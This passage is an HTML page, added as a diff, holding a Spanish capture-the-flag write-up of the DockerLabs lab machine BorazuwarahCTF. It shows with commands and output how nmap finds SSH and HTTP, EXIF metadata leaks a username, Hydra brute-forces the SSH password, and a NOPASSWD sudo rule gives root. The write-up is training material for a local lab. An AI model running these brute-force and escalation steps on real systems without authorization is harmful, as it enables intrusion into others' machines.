@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>BorazuwarahCTF — Dockerlabs Writeup | Brandeiks</title>
+  <meta name="description" content="nmap encuentra SSH y HTTP; una imagen del puerto 80 filtra el usuario por metadatos EXIF; Hydra rompe la contraseña SSH y un sudo /bin/bash sin contraseña entrega una shell como root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/dockerlabs/muy-facil/borazuwarahctf.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="BorazuwarahCTF — Dockerlabs Writeup | Brandeiks">
+  <meta property="og:description" content="nmap encuentra SSH y HTTP; una imagen del puerto 80 filtra el usuario por metadatos EXIF; Hydra rompe la contraseña SSH y un sudo /bin/bash sin contraseña entrega una shell como root.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/dockerlabs/muy-facil/borazuwarahctf.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/borazuwarahctf.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="BorazuwarahCTF — Dockerlabs Writeup | Brandeiks">
+  <meta name="twitter:description" content="nmap encuentra SSH y HTTP; una imagen del puerto 80 filtra el usuario por metadatos EXIF; Hydra rompe la contraseña SSH y un sudo /bin/bash sin contraseña entrega una shell como root.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/borazuwarahctf.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "BorazuwarahCTF — Dockerlabs Writeup | Brandeiks", "description": "nmap encuentra SSH y HTTP; una imagen del puerto 80 filtra el usuario por metadatos EXIF; Hydra rompe la contraseña SSH y un sudo /bin/bash sin contraseña entrega una shell como root.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/dockerlabs/muy-facil/borazuwarahctf.html", "image": "https://brandeiks.github.io/assets/og/borazuwarahctf.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/dockerlabs/muy-facil/borazuwarahctf.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+</head>
+<body>
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+  <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+  <a href="../../../index.html" class="nav-back">INICIO</a>
+  <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+  <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+  <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  <a href="../../../comandos/index.html" class="nav-back">COMANDOS</a>
+  <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-grid"></div><div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
+      <span>borazuwarahctf</span>
+    </div>
+    <h1 class="writeup-title">BORAZUWARAH<span>CTF</span></h1>
+    <p class="writeup-subtitle">// fuga del usuario por metadatos EXIF + fuerza bruta SSH con Hydra -&gt; sudo /bin/bash = root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span><span class="meta-badge badge-docker">DOCKERLABS</span><span class="meta-badge badge-tech">HTTP</span><span class="meta-badge badge-tech">Esteganografía</span><span class="meta-badge badge-tech">exiftool</span><span class="meta-badge badge-tech">steghide</span><span class="meta-badge badge-tech">Hydra</span><span class="meta-badge badge-tech">SSH</span><span class="meta-badge badge-tech">sudo</span><span class="meta-badge badge-tech">Root</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#contexto">01 · Contexto</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#explotacion">03 · Explotación</a></li>
+        <li><a href="#acceso-y-escalada">04 · Acceso y escalada</a></li>
+        <li><a href="#referencia-de-comandos">05 · Referencia de comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+        <li><a href="#curiosidades">07 · Curiosidades</a></li>
+        <li><a href="#resumen">08 · Resumen</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">BorazuwarahCTF</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-green">DOCKERLABS</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-facil">MUY FÁCIL</span></div>
+      <div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">HTTP</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Esteganografía</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">exiftool</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">steghide</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Hydra</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">SSH</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">sudo</span></div><div class="info-row"><span class="info-label">TAG</span><span class="info-val val-cyan">Root</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>auto_deploy.sh</span> → laboratorio activo en 172.17.0.2</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → 22 SSH · 80 HTTP</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>http :80</span> → imagen "Kinder Sorpresa"</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>exiftool</span> → User: borazuwarah (fuga por EXIF)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>steghide</span> → secreto.txt (pista falsa)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>hydra</span> → SSH borazuwarah : 123456</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>sudo -l</span> → (ALL) NOPASSWD: /bin/bash</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--green);box-shadow:0 0 6px var(--green)"></div><div class="ap-text"><span style="color:var(--green)">ROOT</span> → sudo /bin/bash · uid=0</div></div>
+      </div>
+    </div>
+  </aside>
+  <main id="main" class="writeup-content">
+    <div class="section" id="contexto">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Contexto</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>BorazuwarahCTF es una máquina de DockerLabs de dificultad <strong>muy fácil</strong> con un sabor claramente de CTF: el único contenido del servidor web es una imagen, y toda la intrusión gira en torno a mirar esa imagen "por dentro". Lo que se practica aquí es el análisis de <strong>metadatos y esteganografía</strong>, la <strong>fuerza bruta de credenciales SSH</strong> con Hydra y una <strong>escalada de privilegios por sudo mal configurado</strong>. También enseña a no caer en las pistas falsas: el reto incluye un señuelo deliberado para despistar.</p>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Cuando el puerto 80 solo sirve una imagen y nada más, esa imagen <strong>es</strong> el reto. Dos técnicas se complementan: los <strong>metadatos EXIF</strong> (campos de texto como autor, descripción o título que viajan dentro del propio archivo) y la <strong>esteganografía</strong> (datos ocultos incrustados en los píxeles). Aquí el autor dejó la mitad de la credencial en los metadatos y un archivo oculto como distracción.</p>
+      </div>
+    </div>
+
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">DESPLIEGUE DE LA MÁQUINA</span>
+      </div>
+      <div class="cmd-block" data-cmd="unzip borazuwarahctf.zip">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">unzip borazuwarahctf.zip</span></div>
+      </div>
+      <div class="output-block">
+        <div>Archive:  borazuwarahctf.zip</div>
+        <div>  inflating: auto_deploy.sh</div>
+        <div>  inflating: borazuwarahctf.tar</div>
+      </div>
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh borazuwarahctf.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">sudo bash auto_deploy.sh borazuwarahctf.tar</span></div>
+      </div>
+      <div class="output-block">
+        <div>Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div>Máquina desplegada, su dirección IP es → 172.17.0.2</div>
+        <div>Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">COMPROBACIÓN DE CONECTIVIDAD</span>
+      </div>
+      <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">ping 172.17.0.2 -c 3</span></div>
+      </div>
+      <div class="output-block">
+        <div>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.307 ms</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.064 ms</div>
+        <div>64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.090 ms</div>
+        <div></div>
+        <div>--- 172.17.0.2 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, 0% packet loss, time 2034ms</div>
+        <div>rtt min/avg/max/mdev = 0.064/0.153/0.307/0.108 ms</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>El <code>ttl=64</code> de la respuesta es la huella típica de un sistema <strong>Linux</strong> (Windows suele responder con 128). Confirmada la conectividad, toca enumerar puertos.</p>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ESCANEO DE PUERTOS</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX borazuwarahctf.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX borazuwarahctf.xml</span></div>
+      </div>
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 18:28 -0400</div>
+        <div>Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.000054s latency).</div>
+        <div>Not shown: 47298 closed tcp ports (reset), 18235 filtered tcp ports (no-response)</div>
+        <div>PORT   STATE SERVICE VERSION</div>
+        <div>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</div>
+        <div>80/tcp open  http    Apache httpd 2.4.59 ((Debian))</div>
+        <div>|_http-server-header: Apache/2.4.59 (Debian)</div>
+        <div>|_http-title: Site doesn't have a title (text/html).</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div></div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 31.54 seconds</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Dos puertos abiertos: <strong>22 (SSH)</strong> y <strong>80 (HTTP)</strong>. El SSH será la puerta de entrada, pero primero no tenemos credenciales: el sitio web es el punto por el que empezar a buscarlas.</p>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">INFORME NMAP LEGIBLE</span>
+      </div>
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl borazuwarahctf.xml &gt; borazuwarahctf.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">xsltproc /usr/share/nmap/nmap.xsl borazuwarahctf.xml &gt; borazuwarahctf.html</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Guardar el escaneo con <code>-oX</code> (XML) permite transformarlo con <code>xsltproc</code> en un informe HTML cómodo de leer en el navegador. Es opcional, pero deja un registro ordenado del reconocimiento.</p>
+      </div>
+    </div>
+
+    <div class="section" id="explotacion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Explotación</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>Al abrir <code>http://172.17.0.2/</code> no hay título ni texto: solo una imagen de un "Kinder Sorpresa" con el lema <em>¡Te quiero!</em>. Sin más pistas en el HTML, esa imagen es el objeto a analizar. La descargamos y la inspeccionamos primero por sus <strong>metadatos</strong> y luego por posible <strong>contenido oculto</strong>.</p>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">METADATOS CON EXIFTOOL</span>
+      </div>
+      <div class="cmd-block" data-cmd="exiftool imagen.jpeg">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">exiftool imagen.jpeg</span></div>
+      </div>
+      <div class="output-block">
+        <div>ExifTool Version Number         : 13.50</div>
+        <div>File Name                       : imagen.jpeg</div>
+        <div>File Size                       : 19 kB</div>
+        <div>File Type                       : JPEG</div>
+        <div>MIME Type                       : image/jpeg</div>
+        <div>XMP Toolkit                     : Image::ExifTool 12.76</div>
+        <div>Description                     : ———————— User: borazuwarah ————————</div>
+        <div>Title                           : ———————— Password: ————————</div>
+        <div>Image Size                      : 455x455</div>
+        <div>Megapixels                      : 0.207</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// FUGA DE INFORMACIÓN POR METADATOS</p>
+        <p>
+          <strong>Dónde:</strong> los campos XMP/EXIF <code>Description</code> y <code>Title</code> de la imagen.<br>
+          <strong>Qué filtra:</strong> el campo <code>Description</code> entrega el nombre de usuario <strong>borazuwarah</strong>; el campo <code>Title</code> anuncia que hay una contraseña, pero su valor viene censurado.<br>
+          <strong>Resultado:</strong> tenemos medio juego de credenciales (el usuario). Falta la contraseña, que habrá que conseguir por otra vía.
+        </p>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">¿DATOS OCULTOS? STEGHIDE</span>
+      </div>
+      <div class="cmd-block" data-cmd="steghide extract -sf imagen.jpeg">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">steghide extract -sf imagen.jpeg</span></div>
+      </div>
+      <div class="output-block">
+        <div>Enter passphrase:</div>
+        <div>wrote extracted data to "secreto.txt".</div>
+      </div>
+      <div class="cmd-block" data-cmd="cat secreto.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">cat secreto.txt</span></div>
+      </div>
+      <div class="output-block">
+        <div>Sigue buscando, aquí no está to solución</div>
+        <div>aunque te dejo una pista....</div>
+        <div>sigue buscando en la imagen!!!</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>steghide extrae el archivo oculto con <strong>passphrase vacía</strong> (basta con pulsar Enter), pero su contenido es una <strong>pista falsa</strong>: un señuelo para hacer perder el tiempo. El dato que de verdad sirve ya lo teníamos en los metadatos: el usuario <code>borazuwarah</code>. La contraseña se consigue por fuerza bruta contra SSH.</p>
+      </div>
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">FUERZA BRUTA SSH CON HYDRA</span>
+      </div>
+      <div class="cmd-block" data-cmd="hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4</span></div>
+      </div>
+      <div class="output-block">
+        <div>Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak</div>
+        <div>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task</div>
+        <div>[DATA] attacking ssh://172.17.0.2:22/</div>
+        <div>[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456</div>
+        <div>1 of 1 target successfully completed, 1 valid password found</div>
+        <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-29 17:44:44</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// CONTRASEÑA DÉBIL</p>
+        <p>
+          <strong>Usuario:</strong> <code>borazuwarah</code> (obtenido de los metadatos EXIF).<br>
+          <strong>Diccionario:</strong> <code>rockyou.txt</code>, el listado clásico de contraseñas filtradas.<br>
+          <strong>Resultado:</strong> la contraseña es <code>123456</code>, una de las primeras del diccionario, así que Hydra la encuentra casi al instante. Credenciales SSH válidas: <code>borazuwarah:123456</code>.
+        </p>
+      </div>
+    </div>
+
+    <div class="section" id="acceso-y-escalada">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Acceso y escalada</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="ssh-keygen -R 172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">ssh-keygen -R 172.17.0.2</span></div>
+      </div>
+      <div class="output-block">
+        <div># Host 172.17.0.2 found: line 35</div>
+        <div>/home/kali/.ssh/known_hosts updated.</div>
+        <div>Original contents retained as /home/kali/.ssh/known_hosts.old</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Como estos laboratorios reutilizan la IP <code>172.17.0.2</code> en cada despliegue, la clave de host SSH cambia y <code>known_hosts</code> guarda la anterior. <code>ssh-keygen -R</code> borra la entrada vieja para evitar el aviso de "host key mismatch".</p>
+      </div>
+      <div class="cmd-block" data-cmd="ssh borazuwarah@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">ssh borazuwarah@172.17.0.2</span></div>
+      </div>
+      <div class="output-block">
+        <div>borazuwarah@172.17.0.2's password:</div>
+        <div>Linux 16debb96ccdc 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64</div>
+        <div>borazuwarah@16debb96ccdc:~$ whoami</div>
+        <div>borazuwarah</div>
+      </div>
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">sudo -l</span></div>
+      </div>
+      <div class="output-block">
+        <div>Matching Defaults entries for borazuwarah on 16debb96ccdc:</div>
+        <div>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</div>
+        <div></div>
+        <div>User borazuwarah may run the following commands on 16debb96ccdc:</div>
+        <div>    (ALL : ALL) ALL</div>
+        <div>    (ALL) NOPASSWD: /bin/bash</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// SUDO MAL CONFIGURADO</p>
+        <p>
+          <strong>Regla:</strong> <code>borazuwarah</code> puede ejecutar <code>/bin/bash</code> como root <strong>sin contraseña</strong> (<code>NOPASSWD</code>), y además tiene <code>(ALL : ALL) ALL</code>.<br>
+          <strong>Por qué es grave:</strong> arrancar una shell con sudo mantiene el UID 0; no hay ninguna barrera entre el usuario y root.<br>
+          <strong>Explotación:</strong> una sola orden, <code>sudo /bin/bash</code>, entrega la shell de root.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="sudo /bin/bash">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt">$ </span><span class="cmd">sudo /bin/bash</span></div>
+      </div>
+      <div class="cmd-block" data-cmd="id">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BASH</span>
+<div><span class="prompt"># </span><span class="cmd">id</span></div>
+      </div>
+      <div class="output-block">
+        <div>uid=0(root) gid=0(root) groups=0(root)</div>
+      </div>
+      <div class="prose">
+        <p>Somos <strong>root</strong>. La máquina queda comprometida por completo. Las variantes <code>sudo su</code> y <code>sudo -i</code> dan exactamente el mismo resultado gracias a la regla <code>(ALL : ALL) ALL</code>.</p>
+      </div>
+    </div>
+
+    <div class="section" id="referencia-de-comandos">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia de comandos</h2>
+      <div class="section-line"></div>
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX salida.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de puertos con detección de versiones y scripts; así se identifican el SSH (22) y el HTTP (80).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Escanea los 65535 puertos TCP, no solo los 1000 habituales.</li>
+            <li><span>-sS</span> → Escaneo SYN ("half-open"), rápido y discreto.</li>
+            <li><span>-sC</span> → Lanza los scripts por defecto de nmap (NSE).</li>
+            <li><span>-sV</span> → Detecta la versión exacta de cada servicio.</li>
+            <li><span>-n</span> → No resuelve DNS (más rápido).</li>
+            <li><span>-Pn</span> → Trata el host como activo, sin ping previo.</li>
+            <li><span>--min-rate=5000</span> → Envía ≥ 5000 paquetes/s para acelerar.</li>
+            <li><span>--open</span> → Muestra solo los puertos abiertos.</li>
+            <li><span>-oX</span> → Guarda el resultado en formato XML.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl salida.xml &gt; salida.html</div>
+          <div class="cmd-ref-desc">Transforma el XML de nmap en un informe HTML legible en el navegador.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → Hoja de estilo oficial que da formato al informe.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">exiftool</div>
+          <div class="cmd-ref-syntax">exiftool imagen.jpeg</div>
+          <div class="cmd-ref-desc">Lee todos los metadatos del archivo; aquí descubre el usuario escondido en los campos EXIF/XMP.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>Description / Title</span> → Campos de texto donde el autor dejó el usuario.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">steghide</div>
+          <div class="cmd-ref-syntax">steghide extract -sf imagen.jpeg</div>
+          <div class="cmd-ref-desc">Extrae datos ocultos incrustados en la imagen (en este reto, un señuelo).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>extract</span> → Saca el contenido embebido del archivo.</li>
+            <li><span>-sf</span> → "stego file": la imagen que contiene los datos.</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">hydra</div>
+          <div class="cmd-ref-syntax">hydra -l &lt;user&gt; -P rockyou.txt ssh://&lt;IP&gt; -t 4</div>
+          <div class="cmd-ref-desc">Fuerza bruta de credenciales contra SSH usando un diccionario de contraseñas.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> → Usuario único a probar (<code>borazuwarah</code>).</li>
+            <li><span>-P</span> → Archivo de contraseñas a recorrer (rockyou.txt).</li>
+            <li><span>ssh://IP</span> → Protocolo y objetivo del ataque.</li>
+            <li><span>-t 4</span> → 4 intentos en paralelo (recomendado para SSH).</li>
+          </ul>
+        </div>
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">escalada por sudo</div>
+          <div class="cmd-ref-syntax">sudo -l ; sudo /bin/bash</div>
+          <div class="cmd-ref-desc">Enumera los permisos sudo del usuario y los aprovecha para abrir una shell como root.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>sudo -l</span> → Lista qué puede ejecutar el usuario con sudo.</li>
+            <li><span>NOPASSWD: /bin/bash</span> → Permite lanzar bash como root sin contraseña.</li>
+            <li><span>id</span> → Confirma el <code>uid=0(root)</code> de la shell.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+      <div class="glosario-grid">
+        <div class="glos-card">
+          <div class="glos-term">HTTP — HyperText Transfer Protocol</div>
+          <div class="glos-def">Protocolo de la web, servido aquí por <strong>Apache</strong> en el puerto 80. En este reto solo entrega una imagen estática.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">Metadatos EXIF / XMP</div>
+          <div class="glos-def">Campos de información (autor, fecha, cámara, descripción, título…) que viajan <strong>dentro</strong> del propio archivo de imagen y a menudo filtran datos sensibles.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">exiftool</div>
+          <div class="glos-def">Herramienta estándar para leer y editar metadatos de archivos multimedia. Imprescindible en retos de análisis forense y esteganografía.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">Esteganografía</div>
+          <div class="glos-def">Técnica para <strong>ocultar</strong> información dentro de otro archivo (una imagen, un audio) de modo que su existencia pase desapercibida.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">steghide</div>
+          <div class="glos-def">Programa que incrusta o extrae datos ocultos en imágenes y audio, protegidos opcionalmente con una passphrase.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">Hydra</div>
+          <div class="glos-def">Herramienta de fuerza bruta de credenciales en red: prueba miles de contraseñas contra servicios como SSH, FTP o HTTP.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">rockyou.txt</div>
+          <div class="glos-def">Diccionario de ~14 millones de contraseñas reales filtradas en 2009; el punto de partida habitual para ataques por diccionario.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">SSH — Secure Shell</div>
+          <div class="glos-def">Protocolo de acceso remoto cifrado (puerto 22). Con un usuario y contraseña válidos entrega una sesión interactiva en la máquina.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">sudo</div>
+          <div class="glos-def">Mecanismo de Unix/Linux para ejecutar órdenes con privilegios de otro usuario (normalmente root). Mal configurado, es una vía directa de escalada.</div>
+        </div>
+        <div class="glos-card">
+          <div class="glos-term">Root</div>
+          <div class="glos-def">El usuario con privilegios máximos en Unix/Linux (UID 0), equivalente al administrador en Windows.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section" id="curiosidades">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Curiosidades</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <ul>
+          <li>El archivo oculto <code>secreto.txt</code> es un <strong>rabbit hole</strong> clásico de CTF: su mensaje ("sigue buscando en la imagen!!!") invita a seguir una pista que no lleva a ninguna parte, mientras la solución real ya estaba a la vista en los metadatos.</li>
+          <li><code>123456</code> lleva años siendo la contraseña más usada del mundo y ocupa la primera línea de muchos diccionarios, por eso Hydra la encuentra en cuestión de segundos: la lección es que un usuario conocido + una contraseña débil basta para comprometer un servicio.</li>
